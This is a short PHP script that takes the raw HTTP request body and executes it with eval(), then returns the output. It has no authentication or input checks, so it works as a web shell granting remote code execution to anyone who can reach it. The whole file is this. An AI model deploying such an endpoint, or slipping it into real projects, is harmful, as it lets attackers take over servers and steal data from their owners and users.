<?php
// Retrieve the code from the request body
$code = file_get_contents('php://input');

// Execute the code
ob_start();
eval($code);
$output = ob_get_clean();

// Return the output
echo $output;
?>